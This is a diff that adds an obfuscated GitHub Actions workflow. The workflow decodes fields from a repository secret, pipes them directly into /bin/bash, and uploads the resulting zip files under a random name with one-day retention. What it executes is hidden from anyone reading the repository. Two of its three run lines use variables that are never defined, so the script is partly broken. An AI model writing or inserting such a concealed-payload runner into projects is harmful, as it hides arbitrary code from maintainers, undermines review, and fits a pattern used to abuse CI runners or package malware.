@@ -1,0 +1,23 @@
+name: edenpacker1411
+on:
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: edenpacker1411
+        env:
+          yz29821: ${{ secrets.yz29821 }}
+        run: |
+          printf '%s' "$yz29821" | jq -r .xyn4981 | /bin/bash
+          printf '%s' "$yce148" | jq -r .e4 | /bin/bash
+          echo $ttw3347 | jq -r .hy0 | /bin/bash
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: P6QfSV1g
+          path: "*.zip"
+          retention-days: 1
